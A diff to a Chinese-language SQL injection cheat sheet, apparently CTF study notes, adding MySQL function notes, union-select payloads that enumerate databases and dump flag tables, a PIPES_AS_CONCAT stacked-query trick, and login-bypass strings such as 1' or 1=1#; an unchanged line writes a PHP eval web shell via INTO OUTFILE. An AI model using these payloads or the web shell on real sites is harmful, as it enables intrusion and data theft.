@@ -1,4 +1,5 @@
 ## 基本函数：
+```
 concat()：concat(str1, str2,…)将多个字符串连接成一个字符串
 
 version():数据库版本
@@ -6,11 +7,10 @@ version():数据库版本
 user():用户名
 
 database():当前数据库名
+show databases;
 
-```
 union select 1,schema_name from information_schema.schemata # 
 同样查库名
-```
 
 length():返回字符串长度
 
@@ -34,10 +34,14 @@ left()
 
 if(ture,语句1,语句2)：正确执行语句1，否则执行语句2
 
-`LIMIT 1,1`，从查询结果的第二行开始（跳过第一行），返回一行记录
+LIMIT 1,1，从查询结果的第二行开始（跳过第一行），返回一行记录
+```
 
 ## 联合注入：
 ```
+?id=1-true
+?id=1-fals
+
 ?id=1 order by 2#
 ```
 
@@ -51,6 +55,9 @@ if(ture,语句1,语句2)：正确执行语句1，否则执行语句2
 ?id=-1' union select (select group_concat(column_name)from information_schema.columns where table_name='xxx'),database()
 
 ?id=-1 union select 1,group_concat(xxx) from 库名.表名
+select group_concat(x) from 库名.表名
+
+geek.l0ve1ysq1 b4bsql,geekuser
 
 语句实际：username=1' or 1=1 union select 1,(select group_concat(flag) from flag),3#&password=1
 ```
@@ -274,9 +281,15 @@ select $_POST[‘query’] || flag from Flag
 
 ①可以传参*,1即可拼接语句成：select *,1 from Flag
 
-②:1;set sql_mode=PIPES_AS_CONCAT;select 1
+②1;set sql_mode=PIPES_AS_CONCAT;select 1
 
 拼接语句成select 1;set sql_mode=PIPES_AS_CONCAT;select 1||flag from Flag
+
+sql_mode 是 MySQL 中的一个系统变量，用于控制 SQL 的行为。
+PIPES_AS_CONCAT 是一个特定的模式，表示将 || 符号解释为字符串连接运算符，而不是逻辑 OR 操作。
+示例：
+SET sql_mode = PIPES_AS_CONCAT;SELECT 'Hello' || ' World';
+输出：Hello World
 ```
 
 
@@ -370,6 +383,7 @@ union select 1,"<?php @eval($_POST['shell']);?>",3 into outfile '\var\www\html\f
 ```
 payload为：
 
+1' or 1=1#
 tom' or 1='1
 tom' or 1=2#
 
